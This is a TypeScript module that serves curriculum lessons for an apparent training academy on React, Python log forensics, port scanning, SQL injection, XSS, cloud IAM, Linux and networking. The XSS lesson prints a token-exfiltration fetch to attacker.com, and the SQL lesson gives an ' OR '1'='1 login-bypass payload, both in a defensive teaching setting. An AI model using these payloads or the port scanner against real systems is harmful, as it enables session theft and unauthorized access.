/**
 * Domain-specific comprehensive technical curriculum content bank for Zapsters Academy.
 * Delivers in-depth, production-grade technical education across security, cloud,
 * systems engineering, web development, and algorithms.
 */

export interface LessonContentPayload {
  body: string;
  bestPractice: {
    title: string;
    description: string;
  };
  keyTakeaways: string[];
}

export function getLessonContent(
  courseTitle: string,
  category: string,
  lessonTitle: string,
  lessonId: string,
): LessonContentPayload {
  const titleLower = courseTitle.toLowerCase();
  const lessonLower = lessonTitle.toLowerCase();
  const catLower = category.toLowerCase();

  /* ==================================================================== */
  /* 1. REACT & TYPESCRIPT DEEP DIVE                                      */
  /* ==================================================================== */
  if (
    titleLower.includes("react") ||
    titleLower.includes("typescript") ||
    lessonLower.includes("shape of data") ||
    lessonLower.includes("types first") ||
    lessonLower.includes("discriminated union") ||
    lessonLower.includes("tanstack") ||
    lessonLower.includes("render optimisation") ||
    lessonId.startsWith("c3d4e5f6")
  ) {
    if (lessonLower.includes("shape of data") || lessonLower.includes("types first")) {
      return {
        body: `## Types First: The Shape of Data in Modern Applications

Welcome to this technical module. In modern enterprise React and TypeScript engineering, architecture begins with the **domain model**, not the component hierarchy. When data shapes are poorly defined or rely on loosely coupled boolean flags, runtime failures become inevitable.

In this deep dive, we replace error-prone implicit state with mathematically sound, compile-time verified domain models.

---

### 1. The Fallacy of Loose Boolean State Bags

In traditional frontend development, asynchronous state is frequently modeled using discrete, uncoordinated properties:

\`\`\`typescript
// ❌ ANTI-PATTERN: Allows 8 combinations, 4 of which are illegal impossible states!
interface UserViewState {
  isLoading: boolean;
  isError: boolean;
  data: User | null;
  errorMessage: string | null;
}
\`\`\`

Consider what happens if \`isLoading\` is \`true\` while \`data\` is non-null and \`isError\` is \`true\`. Does the UI render a loading spinner, error alert, or stale data? The TypeScript compiler cannot protect you because all 8 combinations are valid according to the interface.

---

### 2. Modeling State with Discriminated Unions

A **discriminated union** (or tagged union) pairs a literal discriminant property (like \`status\`) with only the fields valid in that state:

\`\`\`typescript
// ✅ ENTERPRISE STANDARD: Exactly one state is valid at any instant
export type RemoteData<TData, TError = Error> =
  | { status: "idle"; data?: never; error?: never }
  | { status: "loading"; data?: never; error?: never }
  | { status: "success"; data: TData; error?: never }
  | { status: "error"; data?: never; error: TError };

export function matchRemoteData<TData, TResult>(
  state: RemoteData<TData>,
  matchers: {
    idle: () => TResult;
    loading: () => TResult;
    success: (data: TData) => TResult;
    error: (err: Error) => TResult;
  }
): TResult {
  switch (state.status) {
    case "idle":
      return matchers.idle();
    case "loading":
      return matchers.loading();
    case "success":
      return matchers.success(state.data);
    case "error":
      return matchers.error(state.error);
    default: {
      const _exhaustive: never = state;
      return _exhaustive;
    }
  }
}
\`\`\`

### 3. Exhaustiveness Checking at Compile Time

Notice the \`default\` branch utilizing \`const _exhaustive: never = state;\`. If a new state status is added to \`RemoteData\` (for instance, \`"refreshing"\`), the TypeScript compiler immediately halts with a build error, forcing engineers to handle the new status across all renderers.`,
        bestPractice: {
          title: "Model State Transitions Explicitly",
          description:
            "Never couple uncoordinated booleans like isLoading and isError. Represent state as a discriminated union so invalid states become unrepresentable in the type system.",
        },
        keyTakeaways: [
          "Eliminate impossible states at design time rather than writing runtime defensive checks.",
          "Leverage TypeScript discriminated unions with exhaustiveness checks for all async boundaries.",
          "Define contracts at network perimeters with validation libraries like Zod or ArkType.",
        ],
      };
    }

    if (lessonLower.includes("tanstack") || lessonLower.includes("data layer") || lessonLower.includes("server cache")) {
      return {
        body: `## Architecture of Modern Data Layers with TanStack Query

As web applications scale, treating server responses as client state causes cache divergence, duplicate network traffic, and stale UI representations. In this module, we construct a scalable, resilient server-state layer using TanStack Query.

---

### 1. Client State vs. Server Cache

- **Client State:** Ephemeral, synchronous UI state owned locally (accordion open/closed, modal visibility, draft text input).
- **Server Cache:** Asynchronous snapshot of remote database state, potentially modified by other users or background worker jobs.

\`\`\`typescript
import { queryOptions, useMutation, useQueryClient } from "@tanstack/react-query";

// 1. Centralized Query Key Factory
export const courseKeys = {
  all: ["courses"] as const,
  lists: () => [...courseKeys.all, "list"] as const,
  detail: (id: string) => [...courseKeys.all, "detail", id] as const,
  progress: (courseId: string, userId: string) =>
    [...courseKeys.detail(courseId), "progress", userId] as const,
};

// 2. Composable Query Option Factory
export const courseDetailQueryOptions = (courseId: string) =>
  queryOptions({
    queryKey: courseKeys.detail(courseId),
    queryFn: async ({ signal }) => {
      const res = await fetch(\`/api/courses/\${courseId}\`, { signal });
      if (!res.ok) throw new Error("Failed to load course");
      return (await res.json()) as CoursePayload;
    },
    staleTime: 5 * 60 * 1000, // Fresh for 5 minutes
    gcTime: 30 * 60 * 1000,    // Retained in garbage collection cache for 30m
  });
\`\`\`

---

### 2. Optimistic Updates with Rollback Safeguards

For immediate user feedback, we apply optimistic cache mutations with automated rollback if the network request fails:

\`\`\`typescript
export function useCompleteTopicMutation(courseId: string, userId: string) {
  const queryClient = useQueryClient();
  const queryKey = courseKeys.progress(courseId, userId);

  return useMutation({
    mutationFn: async (topicId: string) => {
      const res = await fetch(\`/api/courses/\${courseId}/topics/\${topicId}/complete\`, {
        method: "POST",
      });
      if (!res.ok) throw new Error("Could not persist completion");
      return res.json();
    },
    onMutate: async (topicId: string) => {
      await queryClient.cancelQueries({ queryKey });
      const previousProgress = queryClient.getQueryData<CourseProgress>(queryKey);

      if (previousProgress) {
        queryClient.setQueryData<CourseProgress>(queryKey, {
          ...previousProgress,
          completed_lesson_ids: [...previousProgress.completed_lesson_ids, topicId],
          progress_pct: Math.min(100, previousProgress.progress_pct + 10),
        });
      }

      return { previousProgress, queryKey };
    },
    onError: (_err, _topicId, context) => {
      if (context?.previousProgress) {
        queryClient.setQueryData(context.queryKey, context.previousProgress);
      }
    },
    onSettled: (_data, _error, _variables, context) => {
      if (context?.queryKey) {
        queryClient.invalidateQueries({ queryKey: context.queryKey });
      }
    },
  });
}
\`\`\``,
        bestPractice: {
          title: "Distinguish Server Cache from Local State",
          description:
            "Store remote data in TanStack Query with deterministic Query Key Factories. Keep React's useState strictly for ephemeral UI state such as dialogs and cursor focus.",
        },
        keyTakeaways: [
          "Query key factories prevent typos and ensure deterministic, scalable cache invalidation across the app.",
          "Optimistic mutations deliver sub-16ms perceived UI updates with automated rollback safeguards.",
          "Configure staleTime based on resource volatility; not all data requires background re-fetching on window focus.",
        ],
      };
    }

    if (lessonLower.includes("render") || lessonLower.includes("memo")) {
      return {
        body: `## Render Optimisation Without Premature Memoization

In modern React applications, premature optimization using \`useMemo\` and \`useCallback\` frequently clutters codebases while actually hurting performance through continuous dependency comparison overhead and closure allocations.

---

### 1. Component Composition: The Natural Optimizer

Often, 90% of re-renders can be eliminated by restructuring component hierarchies instead of memoizing:

\`\`\`tsx
// ❌ RE-RENDERS ENTIRE HEAVY CHILD TREE ON EVERY SCROLL:
function CourseViewer() {
  const [scrollY, setScrollY] = useState(0);
  return (
    <div onScroll={(e) => setScrollY(e.currentTarget.scrollTop)}>
      <ScrollIndicator position={scrollY} />
      <HeavyCourseSyllabusTree />
    </div>
  );
}

// ✅ LIFT CONTENT UP AS CHILDREN — HeavyCourseSyllabusTree NEVER re-renders!
function ScrollTracker({ children }: { children: React.ReactNode }) {
  const [scrollY, setScrollY] = useState(0);
  return (
    <div onScroll={(e) => setScrollY(e.currentTarget.scrollTop)}>
      <ScrollIndicator position={scrollY} />
      {children}
    </div>
  );
}
\`\`\`

Because \`HeavyCourseSyllabusTree\` is passed as \`children\` created in the outer scope, its JSX element reference remains identical across state changes in \`ScrollTracker\`.`,
        bestPractice: {
          title: "Prefer Composition Over Manual Memoization",
          description:
            "Lift invariant components up through children or push fast-changing state down to isolated leaf nodes. Only apply useMemo for computationally heavy algorithms (>5ms).",
        },
        keyTakeaways: [
          "Component composition preserves element identity, preventing child re-renders naturally.",
          "Wrapping cheap expressions in useMemo wastes memory on dependency arrays and hook metadata.",
          "React 19 compiler primitives automate memoization without manual boilerplate in modern toolchains.",
        ],
      };
    }
  }

  /* ==================================================================== */
  /* 2. PYTHON FOR SECURITY ANALYSTS                                      */
  /* ==================================================================== */
  if (
    titleLower.includes("python") ||
    lessonLower.includes("auth-log") ||
    lessonLower.includes("pcap") ||
    lessonLower.includes("port scanner") ||
    lessonLower.includes("log parser") ||
    lessonLower.includes("threat intel") ||
    lessonId.startsWith("a1b2c3d4")
  ) {
    if (lessonLower.includes("auth") || lessonLower.includes("log parser") || lessonLower.includes("regex")) {
      return {
        body: `## High-Performance Security Log Forensics with Python

Security operations centers (SOC) process gigabytes of syslog, auditd, and authentication logs every hour. Relying on manual grep or spreadsheet tools fails during critical incidents. In this module, we construct production-grade Python parsers that extract forensic telemetry with sub-second execution speeds.

---

### 1. Regex Compilation and Named Capture Groups

When scanning millions of log lines, avoid compiling regular expressions inside iterative loops. Compile regular expressions once at module initialization, and use **named capture groups** to produce clean dictionary representations:

\`\`\`python
import re
from datetime import datetime
from typing import Iterator, Dict, Any, Optional

# Standard OpenSSH auth.log pattern with named capture groups
AUTH_FAILED_PATTERN = re.compile(
    r'^(?P<timestamp>[A-Z][a-z]{2}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+'
    r'(?P<hostname>[\w\.\-]+)\s+sshd\[(?P<pid>\d+)\]:\s+'
    r'Failed password for (?:invalid user )?(?P<username>[\w\.\-]+)\s+'
    r'from (?P<source_ip>\d{1,3}(?:\.\d{1,3}){3})\s+port\s+(?P<port>\d+)'
)

def parse_auth_line(line: str) -> Optional[Dict[str, Any]]:
    match = AUTH_FAILED_PATTERN.search(line.strip())
    if not match:
        return None
    data = match.groupdict()
    data['port'] = int(data['port'])
    data['pid'] = int(data['pid'])
    return data
\`\`\`

---

### 2. Streaming Ingestion Using Python Generators

Never read an entire multi-gigabyte log file into RAM with \`file.read()\` or \`file.readlines()\`. Always stream line-by-line using Python generator iterators to maintain a constant ~20MB memory footprint:

\`\`\`python
def stream_log_events(filepath: str) -> Iterator[Dict[str, Any]]:
    with open(filepath, 'r', encoding='utf-8', errors='replace') as log_file:
        for line in log_file:
            event = parse_auth_line(line)
            if event:
                yield event

# Fast aggregations using standard library collections
from collections import Counter

def find_top_brute_force_ips(filepath: str, threshold: int = 5) -> Dict[str, int]:
    attacker_ip_counts = Counter(
        event['source_ip'] for event in stream_log_events(filepath)
    )
    return {ip: count for ip, count in attacker_ip_counts.items() if count >= threshold}
\`\`\`

---

### 3. Forensic Triage Output & Anomaly Detection

Once parsed, forensic events can be exported as structured JSON-Lines or checked against IP reputation blocks to trigger automated firewall rules.`,
        bestPractice: {
          title: "Stream Files and Pre-Compile Regex",
          description:
            "Always compile regex patterns at module level and stream log lines via generators. Loading complete log files into memory causes process crashes during large-scale forensic triage.",
        },
        keyTakeaways: [
          "Named regex capture groups generate self-documenting dictionary keys directly from raw log lines.",
          "Generator streams keep memory consumption flat regardless of log file size (10MB vs 100GB).",
          "Combine Counter and defaultdict from collections for O(N) aggregate threat triage.",
        ],
      };
    }

    if (lessonLower.includes("scanner") || lessonLower.includes("tcp") || lessonLower.includes("socket")) {
      return {
        body: `## Network Automation: Building a Multi-Threaded TCP Port Scanner

Understanding the mechanics of network transport requires writing socket code from first principles. In this topic, we implement an asynchronous TCP connection scanner that accurately identifies active services while managing concurrency limits and timeout thresholds.

---

### 1. The TCP 3-Way Handshake at the Socket Layer

A standard TCP SYN scan attempts to establish a connection using the OS network stack via \`socket.connect_ex()\`. Unlike raw SYN packets which require root/raw privileges, \`connect_ex\` operates reliably in standard user space:

\`\`\`python
import socket
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple

def check_port(host: str, port: int, timeout: float = 1.0) -> Tuple[int, bool]:
    """Attempts a TCP handshake. Returns (port, is_open)."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        # connect_ex returns 0 on success, errno integer on failure
        result = sock.connect_ex((host, port))
        return port, result == 0
\`\`\`

---

### 2. High-Throughput Concurrent Scanning

Scanning 65,535 ports sequentially with a 1-second timeout would take over 18 hours. Using Python's \`ThreadPoolExecutor\`, we parallelize worker threads across port ranges:

\`\`\`python
def scan_target(host: str, ports: List[int], workers: int = 50) -> List[int]:
    open_ports = []
    print(f"[*] Commencing audit against {host} across {len(ports)} ports...")
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(check_port, host, port) for port in ports]
        for future in futures:
            port, is_open = future.result()
            if is_open:
                print(f"[+] Identified OPEN TCP service on port {port}")
                open_ports.append(port)
                
    return sorted(open_ports)

# Typical enterprise reconnaissance ports
STANDARD_AUDIT_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 1433, 3306, 3389, 8080, 8443]
\`\`\`

---

### 3. Ethical Considerations and Rate Limiting

In production assessments, excessive connection velocity can trigger denial of service on embedded devices or alert intrusion detection tripwires. Always implement configurable worker counts and exponential backoff parameters.`,
        bestPractice: {
          title: "Enforce Socket Timeouts & Managed Pools",
          description:
            "Never open sockets without explicit timeouts. Unbounded blocking calls will freeze thread pools and exhaust system file descriptors during network packet loss.",
        },
        keyTakeaways: [
          "socket.connect_ex() returns error numbers directly without raising runtime exceptions on closed ports.",
          "ThreadPoolExecutor scales TCP discovery safely without overloading target networking stacks.",
          "Audit scans must respect legal scope boundaries and bandwidth quotas.",
        ],
      };
    }
  }

  /* ==================================================================== */
  /* 3. OFFENSIVE WEB APP TESTING & OWASP TOP TEN                         */
  /* ==================================================================== */
  if (
    titleLower.includes("offensive") ||
    titleLower.includes("web app") ||
    lessonLower.includes("sql") ||
    lessonLower.includes("xss") ||
    lessonLower.includes("idor") ||
    lessonLower.includes("rce") ||
    lessonLower.includes("recon") ||
    lessonId.startsWith("b2c3d4e5")
  ) {
    if (lessonLower.includes("sql") || lessonLower.includes("injection")) {
      return {
        body: `## Deep Dive: SQL Injection Analysis & Defensive Parameterization

SQL Injection remains one of the most critical web application vulnerabilities. It occurs when untrusted user input is concatenated directly into SQL command strings, altering the query interpreter's execution logic.

---

### 1. Anatomy of SQL Injection

Consider a vulnerable authentication query:

\`\`\`sql
-- Vulnerable query constructed with string formatting:
SELECT id, username, role FROM users 
WHERE username = 'admin' AND password = 'user_input';
\`\`\`

If an attacker supplies \`' OR '1'='1\` as the password payload, the resulting query evaluated by the SQL engine becomes:

\`\`\`sql
SELECT id, username, role FROM users 
WHERE username = 'admin' AND password = '' OR '1'='1';
\`\`\`

Because the \`OR '1'='1'\` condition evaluates to true for every database row, authentication is bypassed entirely without knowing the user's password.

---

### 2. The Defensive Solution: Parameterized Prepared Statements

The only robust mitigation is **prepared statements with parameterized inputs**. In parameterized queries, the database engine compiles the SQL syntax tree *before* binding user variables. The database treats input purely as literal data values, never as executable code:

\`\`\`typescript
// ✅ DEFENSIVE STANDARD: Prepared statements prevent injection completely
import { Pool } from "pg";
const pool = new Pool();

export async function authenticateUser(username: string, passwordHash: string) {
  const query = \`
    SELECT id, username, role, email 
    FROM users 
    WHERE username = $1 AND password_hash = $2
    LIMIT 1;
  \`;
  
  // Arguments are passed in a separate array — never concatenated!
  const result = await pool.query(query, [username, passwordHash]);
  return result.rows[0] ?? null;
}
\`\`\`

---

### 3. Blind SQL Injection & Out-of-Band Exfiltration

When error messages are suppressed in production environments, attackers leverage **Boolean-based** or **Time-based Blind SQLi** (e.g. \`pg_sleep(5)\`) to infer data character-by-character based on server response latency.`,
        bestPractice: {
          title: "Zero String Concatenation in SQL",
          description:
            "Never construct SQL queries with string interpolation or template literals. Always bind variables using parameterized prepared statements or audited ORM abstractions.",
        },
        keyTakeaways: [
          "SQL injection occurs when user data is interpreted as database command syntax.",
          "Prepared statements pre-compile query trees, rendering all user input harmless literal strings.",
          "Input validation and WAFs are secondary layers of defense; parameterization is the primary safeguard.",
        ],
      };
    }

    if (lessonLower.includes("xss") || lessonLower.includes("session")) {
      return {
        body: `## Cross-Site Scripting (XSS) and Modern Session Security

Cross-Site Scripting (XSS) occurs when an application includes untrusted user data in a browser web page without proper validation or contextual encoding. An attacker can execute arbitrary JavaScript in the victim's browser session, allowing credential theft and session hijacking.

---

### 1. XSS Vectors: Stored vs. Reflected vs. DOM-based

1. **Stored XSS:** Malicious payload is permanently saved in the database (e.g., user profile name, comment body) and served to all subsequent visitors.
2. **Reflected XSS:** The script is reflected off the web server in an immediate HTTP response (e.g., search queries, error banners).
3. **DOM-based XSS:** The vulnerability exists entirely in client-side code where unsafe sinks like \`innerHTML\` or \`eval()\` consume unvalidated sources like \`location.hash\`.

---

### 2. Modern Session Hardening Against Token Theft

If an application stores JWT tokens in \`localStorage\`, any XSS flaw allows full credential theft via \`fetch('https://attacker.com/steal?c=' + localStorage.getItem('token'))\`.

To neutralize token theft, sessions should be stored in **HttpOnly, Secure, SameSite=Strict cookies**:

\`\`\`typescript
// Server-side response header configuration:
response.cookies.set({
  name: "session_token",
  value: sessionToken,
  httpOnly: true, // Prevents client-side JS (document.cookie) from accessing token
  secure: true,   // Requires HTTPS transmission
  sameSite: "strict", // Blocks Cross-Site Request Forgery (CSRF)
  path: "/",
  maxAge: 60 * 60 * 24, // 24 hours
});
\`\`\`

---

### 3. Content Security Policy (CSP)

A robust CSP HTTP header defines which domains the browser is allowed to load scripts, styles, and web socket connections from:

\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'self';
\`\`\``,
        bestPractice: {
          title: "Store Authentication Tokens in HttpOnly Cookies",
          description:
            "Never store sensitive authentication tokens in localStorage or sessionStorage. Use HttpOnly, Secure, SameSite cookies and enforce strict Content Security Policies.",
        },
        keyTakeaways: [
          "HttpOnly cookies ensure that even if an XSS vulnerability exists, session tokens cannot be read via JavaScript.",
          "Sanitize and contextual-encode all untrusted input before rendering in web templates.",
          "Enforce a strict Content Security Policy to disallow inline scripts and unauthorized external domains.",
        ],
      };
    }
  }

  /* ==================================================================== */
  /* 4. CLOUD SECURITY ESSENTIALS                                         */
  /* ==================================================================== */
  if (
    titleLower.includes("cloud") ||
    lessonLower.includes("iam") ||
    lessonLower.includes("vpc") ||
    lessonLower.includes("s3") ||
    lessonLower.includes("cloudtrail") ||
    lessonId.startsWith("e5f6a7b8")
  ) {
    return {
      body: `## Cloud Security Architecture: Least-Privilege IAM & Telemetry

Modern cloud infrastructures in AWS, GCP, and Azure rely on declarative Identity and Access Management (IAM) policies rather than physical network perimeters. Misconfigured IAM permissions represent the leading cause of enterprise cloud security breaches.

---

### 1. IAM Policy Evaluation Logic & Least Privilege

Cloud IAM evaluates requests by combining Identity policies, Resource policies, Permissions Boundaries, and Service Control Policies (SCPs). The default decision is an **implicit deny**:

1. If an **explicit deny** exists anywhere in the evaluation chain, the request is immediately rejected.
2. At least one **explicit allow** must match for the request to succeed.
3. If no explicit allow matches, the request is **implicitly denied**.

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RestrictS3ToSpecificPrefix",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::production-app-artifacts/deployments/*",
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "true"
        }
      }
    },
    {
      "Sid": "DenyUnencryptedTraffic",
      "Effect": "Deny",
      "Action": "s3:*",
      "Resource": "arn:aws:s3:::production-app-artifacts/*",
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
\`\`\`

---

### 2. Multi-Tier VPC Network Segmentation

A resilient cloud VPC segregates workloads across isolated subnet tiers:

- **Public Subnet Tier:** Houses Internet-facing Load Balancers and NAT Gateways only. No compute instances or databases.
- **Private Subnet Tier:** Application compute containers (ECS/EKS/EC2) that have no public IP addresses. Outbound traffic routes via NAT.
- **Isolated Data Tier:** Relational databases (RDS/Postgres) and Redis caches with zero route to the internet, communicating solely with the application tier via security group rules.

---

### 3. Continuous Telemetry & Audit Logs

Ensure CloudTrail management events, VPC Flow Logs, and S3 Server Access Logs are aggregated into an immutable, write-once storage bucket with object-lock enabled.`,
      bestPractice: {
        title: "Enforce TLS in Transit and Scoped IAM Resources",
        description:
          "Never use wildcard ('*') resource assignments in IAM actions. Always condition S3 access with aws:SecureTransport=true to prevent plain-text eavesdropping.",
      },
      keyTakeaways: [
        "Explicit deny statements take absolute precedence over any allow statement in cloud IAM.",
        "Segment workloads across Public, Private, and Database VPC subnets with zero direct internet access to databases.",
        "Enable immutable audit logs with multi-region replication for forensic accountability.",
      ],
    };
  }

  /* ==================================================================== */
  /* 5. LINUX FUNDAMENTALS & SYSTEMS ARCHITECTURE                         */
  /* ==================================================================== */
  if (
    titleLower.includes("linux") ||
    titleLower.includes("systems") ||
    lessonLower.includes("process") ||
    lessonLower.includes("pipe") ||
    lessonLower.includes("systemd") ||
    lessonLower.includes("permissions") ||
    lessonId.startsWith("d4e5f6a7")
  ) {
    return {
      body: `## Linux Systems Engineering: Kernel Process Model & Stream Piping

Linux powers cloud infrastructure, container runtimes, and cyber defense tooling. Mastering the Unix philosophy — where everything is a file and small programs pipe output into one another — is foundational for systems engineering.

---

### 1. Process Lifecycle, Fork/Exec & Signals

Every process in Linux is spawned through the \`fork()\` and \`execve()\` system calls, forming a hierarchical tree rooted at PID 1 (\`systemd\` or \`init\`):

- **SIGTERM (Signal 15):** Graceful shutdown request allowing the process to clean up network connections and flush buffers.
- **SIGKILL (Signal 9):** Immediate termination enforced directly by the Linux kernel; cannot be caught or ignored.
- **SIGHUP (Signal 1):** Typically triggers daemon configuration reloads without restarting the process.

\`\`\`bash
# Inspecting process hierarchy and resource utilization
ps -eo pid,ppid,user,%cpu,%mem,cmd --forest

# Graceful service termination sequence
kill -15 <PID>
# Verify exit status, fallback to force-kill only after timeout
sleep 3 && kill -0 <PID> 2>/dev/null && kill -9 <PID>
\`\`\`

---

### 2. Unix Pipe Architecture & High-Performance Text Processing

Linux pipes connect the \`stdout\` of one process directly to the \`stdin\` of another via kernel ring buffers without writing temporary files to disk:

\`\`\`bash
# Triage top 10 unique attacking IP addresses from access logs in real time
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -n 10

# Real-time monitoring of failed authentication attempts via journalctl
journalctl -u ssh.service -f --output=short-iso | grep --line-buffered "Failed password"
\`\`\`

---

### 3. POSIX Permissions & Access Control Lists (ACLs)

Understanding the standard 9-bit permission mask (\`rwxr-xr--\`) and sticky bits (\`chmod +t\`) ensures file integrity across multi-tenant servers.`,
      bestPractice: {
        title: "Favor Stream Processing Over Intermediate Files",
        description:
          "Chain utilities using Linux pipes (awk, grep, sed, sort) to avoid disk I/O bottlenecks and process gigabyte datasets in memory.",
      },
      keyTakeaways: [
        "Processes inherit file descriptors and environment variables from their parent during fork().",
        "Pipes pass stream buffers directly through kernel memory with zero disk overhead.",
        "Always send SIGTERM first and allow graceful cleanup before invoking SIGKILL.",
      ],
    };
  }

  /* ==================================================================== */
  /* 6. NETWORKING BASICS & PROTOCOLS                                     */
  /* ==================================================================== */
  if (
    titleLower.includes("network") ||
    catLower.includes("network") ||
    lessonLower.includes("tcp") ||
    lessonLower.includes("dns") ||
    lessonLower.includes("osi") ||
    lessonLower.includes("ip")
  ) {
    return {
      body: `## Computer Networking: OSI 7-Layer Model & Transport Protocols

Networking protocols govern how distributed systems exchange data across the internet. In this module, we dissect packet encapsulation, the TCP handshake, and DNS resolution mechanics.

---

### 1. The OSI vs. TCP/IP Layer Model

1. **Layer 7 - Application:** HTTP/HTTPS, DNS, SSH, gRPC (Application payloads).
2. **Layer 4 - Transport:** TCP (reliable, connection-oriented) vs. UDP (lightweight, datagrams).
3. **Layer 3 - Network:** IPv4, IPv6, ICMP, Routing (Packets & CIDR addresses).
4. **Layer 2 - Data Link:** Ethernet, Wi-Fi, MAC addresses, VLANs (Frames).
5. **Layer 1 - Physical:** Fiber optics, copper wiring, radio frequency signals.

---

### 2. TCP 3-Way Handshake & Teardown

Before transmitting application data over TCP, endpoints establish sequence numbers via a three-way handshake:

\`\`\`text
Client                                  Server
  |                                       |
  | -------- SYN (seq = 1000) ----------> | [LISTEN -> SYN_RECEIVED]
  |                                       |
  | <--- SYN-ACK (seq=5000, ack=1001) --- |
  |                                       |
  | -------- ACK (seq=1001, ack=5001) --> | [ESTABLISHED]
  |                                       |
  | ======== Bidirectional Data Streams ==|
\`\`\`

---

### 3. DNS Resolution Architecture

When resolving a domain name like \`academy.zapsters.dev\`:

1. **Local Resolver:** Checks browser cache, OS hosts file, and local resolver cache.
2. **Recursive Resolver:** Queries DNS Root Nameserver (\`.\`).
3. **TLD Nameserver:** Directs resolver to the \`.dev\` registry authoritative nameservers.
4. **Authoritative Nameserver:** Returns the exact \`A\` or \`CNAME\` record with a configured TTL (Time-To-Live).`,
      bestPractice: {
        title: "Understand MTU Fragmentation & Keepalive Intervals",
        description:
          "Configure standard 1500-byte MTU buffers and tune TCP keepalive probes to prevent firewall state tables from prematurely dropping idle connections.",
      },
      keyTakeaways: [
        "Each layer encapsulates the layer above it, adding headers (Ethernet Frame -> IP Packet -> TCP Segment -> HTTP Payload).",
        "TCP guarantees in-order delivery and congestion control; UDP delivers minimal latency for real-time telemetry.",
        "DNS records leverage TTL caching to balance query latency against DNS change propagation speed.",
      ],
    };
  }

  /* ==================================================================== */
  /* 7. GENERAL ACADEMY TECHNICAL MODULE (COMPREHENSIVE FALLBACK)         */
  /* ==================================================================== */
  return {
    body: `## ${lessonTitle}
### Technical Curriculum · ${courseTitle}

Welcome to this curriculum topic. In this module, we examine the production design patterns, architectural guardrails, and verification principles essential for enterprise engineering.

---

### 1. Core Architectural Pillars

Scalable architectures in ${category} require clear separation of concerns, strong contract boundaries, and verifiable telemetry:

- **Decoupled System Boundaries:** Treat computational workers as disposable and stateful storage as managed, durable persistence.
- **Rigorous Perimeter Controls:** Validate and contextualize all inputs at system boundaries to prevent injection and state corruption.
- **Continuous Validation & Automated Test Harnesses:** Verify all contracts with automated integration suites to prevent regression drift.

\`\`\`typescript
// Production design pattern demonstration for ${courseTitle}
export interface TechnicalModuleConfig {
  readonly moduleName: string;
  readonly category: "${category}";
  readonly concurrencyLimit: number;
  readonly timeoutMs: number;
  readonly telemetryEnabled: boolean;
}

export function createModuleExecutionPlan(config: TechnicalModuleConfig) {
  if (config.timeoutMs <= 0 || config.concurrencyLimit <= 0) {
    throw new Error("Invalid runtime parameters: limits must be positive integers");
  }

  return {
    timestamp: new Date().toISOString(),
    status: "ready" as const,
    plan: \`Executing \${config.moduleName} under strict \${config.category} guardrails\`,
  };
}
\`\`\`

---

### 2. Operational Tradeoffs & Reliability

1. **Principle of Least Privilege:** Minimize blast radius by granting only the exact permissions needed for execution.
2. **Deterministic Reproducibility:** Ensure all workflows can be executed identically across local environments, continuous integration, and production clusters.
3. **Observability First:** Emit structured JSON telemetry and correlation IDs for every state transition to ensure rapid post-incident triage.`,
    bestPractice: {
      title: "Enforce Clear Boundary Abstractions",
      description:
        "Separate business logic from presentation and transport protocols. Ensure contracts are verified at compile time and runtime boundaries.",
    },
    keyTakeaways: [
      "Understand the operational trade-offs of modern production architectures.",
      "Apply least-privilege principles and strong boundary validation across all components.",
      "Verify implementations using interactive sandbox labs and scenario knowledge checks.",
    ],
  };
}
